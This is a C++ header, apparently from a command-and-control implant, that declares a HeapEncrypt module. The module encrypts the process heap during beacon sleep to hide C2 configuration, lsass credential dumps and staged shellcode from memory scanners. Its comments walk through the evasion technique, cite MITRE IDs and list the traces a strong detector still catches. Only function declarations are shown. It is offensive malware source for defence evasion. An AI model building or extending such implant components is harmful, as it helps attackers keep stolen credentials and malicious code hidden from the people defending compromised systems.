#pragma once
#ifndef HEAPENCRYPT_H
#define HEAPENCRYPT_H
#include "common.h"

// HeapEncrypt — XOR-encrypt all live heap chunks during the sleep window.
//
// SleepObfusc already encrypts the .text section. But memory scanners also
// walk the heap looking for:
//   - Config strings (C2 IP/port in plaintext)
//   - Credential buffers (lsass dump data, plaintext passwords)
//   - Shellcode blobs staged in heap allocations
//
// By encrypting all heap chunks alongside .text during every beacon sleep,
// we deny the scanner readable heap data too.
//
// Technique: HeapWalk() the default process heap, then for each committed
// block XOR the payload in place. Re-XOR on wake to restore.
//
// What a strong detector still catches:
//   - HEAP_LOCK_COUNT: HeapLock/HeapUnlock calls visible via ETW
//   - The heap header metadata itself is not encrypted (too risky to corrupt)
//   - Large allocations (>1MB) are skipped to avoid timing anomalies
//   - Entropy spike on heap pages is detectable by page-fault profiling
//
// MITRE T1027.007, T1497.003

namespace HeapEncrypt {
    // XOR all heap chunks ≤ maxBlockSize bytes with the given key.
    // Call before sleeping, then call again with the same key to decrypt.
    // Returns number of blocks processed.
    int EncryptDecrypt(DWORD maxBlockSize = 0x100000); // skip >1MB blocks

    // Combined: heap-encrypt, sleep for `ms` ms, heap-decrypt.
    // Also accepts jitter (added to ms randomly).
    void EncryptedSleep(DWORD ms, DWORD jitter = 0);
}

#endif
